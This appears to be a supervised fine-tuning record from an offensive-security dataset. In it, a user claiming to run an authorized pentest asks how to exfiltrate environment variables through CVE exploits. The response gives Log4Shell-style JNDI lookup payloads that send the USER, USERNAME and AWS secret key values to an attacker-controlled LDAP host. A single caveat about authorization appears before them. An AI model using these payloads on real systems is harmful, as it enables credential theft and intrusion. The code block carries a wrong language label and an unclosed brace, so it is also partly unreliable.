# UNCATEGORIZED — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: uncategorized

## Scenario

I'm doing an authorized pentest and need the Environment variables exfiltration approach for CVE Exploits. Walk me through it with payloads.

## Analysis / Response

**Environment variables exfiltration** — this technique applies to CVE Exploits. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

```powershell
${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/

# AWS Access Key
${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```
